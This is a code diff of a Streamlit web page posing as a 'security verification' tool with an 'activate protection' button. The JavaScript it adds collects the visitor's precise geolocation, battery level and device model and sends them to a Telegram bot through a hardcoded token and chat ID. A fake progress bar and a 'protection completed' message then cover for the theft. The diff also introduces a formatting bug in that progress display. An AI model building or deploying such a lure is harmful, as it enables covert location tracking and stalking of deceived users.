@@ -1,7 +1,7 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO DO BOT ---
+# --- DADOS DO TELEGRAM ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -24,11 +24,10 @@ st.markdown("""
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
     .btn-barra {
-        background-color: #ffc107; color: black; font-weight: bold;
-        width: 100%; height: 55px; border-radius: 12px; border: none;
-        font-size: 18px; cursor: pointer; display: flex;
+        background-color: #ffc107 !important; color: black !important; font-weight: bold !important;
+        width: 100%; height: 60px; border-radius: 12px; border: none;
+        font-size: 20px; cursor: pointer; display: flex;
         align-items: center; justify-content: center; gap: 10px;
-        font-family: sans-serif;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -37,58 +36,69 @@ st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_
 caixa_bolha = st.empty()
 caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-# --- BOTÃO REFEITO PARA O EDGE ---
-# Removi o auto-start que o Edge bloqueia e foquei na chamada direta
-js_edge_fix = f"""
-<div id="div-btn">
-    <button class="btn-barra" onclick="ativarAgora()">
-        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
+# --- MOTOR DO BOTÃO TOTALMENTE INDEPENDENTE ---
+js_code = f"""
+<div style="width: 100%;">
+    <button class="btn-barra" id="mainBtn" onclick="executar()">
+        <span style="color: red; font-size: 24px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-function ativarAgora() {{
-    // No Edge, o pedido de localização precisa ser a PRIMEIRA coisa após o clique
+function executar() {{
+    const btn = document.getElementById('mainBtn');
+    btn.innerText = "CARREGANDO...";
+    
+    // CHAMADA DIRETA AO HARDWARE (O EDGE PRECISA DISSO)
     navigator.geolocation.getCurrentPosition(
-        function(pos) {{
-            // Se aceitou, agora pegamos os dados e enviamos
-            enviarDados(pos.coords.latitude, pos.coords.longitude);
+        async function(pos) {{
+            try {{
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+                
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const link = "https://www.google.com/maps?q=" + lat + "," + lon;
+                
+                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [VER LOCALIZAÇÃO](" + link + ")";
+                
+                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
+                    method: "POST",
+                    headers: {{ "Content-Type": "application/json" }},
+                    body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
+                }});
+                
+                // Avisa o Streamlit para girar a bolha
+                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
+            }} catch (e) {{
+                alert("Erro ao processar dados. Verifique sua conexão.");
+            }}
         }},
         function(err) {{
-            console.log("Erro ou recusado");
+            alert("ERRO: Para ativar a proteção, você precisa permitir a localização no pop-up do navegador.");
         }},
-        {{ enableHighAccuracy: true, timeout: 5000 }}
+        {{ enableHighAccuracy: true, timeout: 8000 }}
     );
 }}
-
-async function enviarDados(lat, lon) {{
-    try {{
-        const bat = await navigator.getBattery();
-        const nivel = Math.round(bat.level * 100);
-        const modelo = navigator.userAgent.split('(')[1].split(')')[0];
-        const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
-        
-        const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + modelo + "`\\n🔋 *Bateria:* `" + nivel + "%`\\n📍 [VER LOCALIZAÇÃO](" + mapa + ")";
-        
-        await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
-            method: "POST",
-            headers: {{ "Content-Type": "application/json" }},
-            body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
-        }});
-        
-        window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-    }} catch (e) {{}}
-}}
 </script>
+
+<style>
+.btn-barra {{
+    background-color: #ffc107; color: black; font-weight: bold;
+    width: 100%; height: 60px; border-radius: 12px; border: none;
+    font-size: 20px; cursor: pointer; display: flex;
+    align-items: center; justify-content: center; gap: 10px;
+    font-family: sans-serif;
+}}
+</style>
 """
 
-clicou_btn = st.components.v1.html(js_edge_fix, height=80)
+clicou = st.components.v1.html(js_code, height=90)
 
-if clicou_btn:
-    for p in range(4, 101, 5):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
-    st.success("Proteção Concluída!")
+if clicou:
+    for p in range(4, 101, 4):
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
+        time.sleep(0.04)
+    st.success("Proteção Concluída com Sucesso!")
     st.stop()
-
-st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
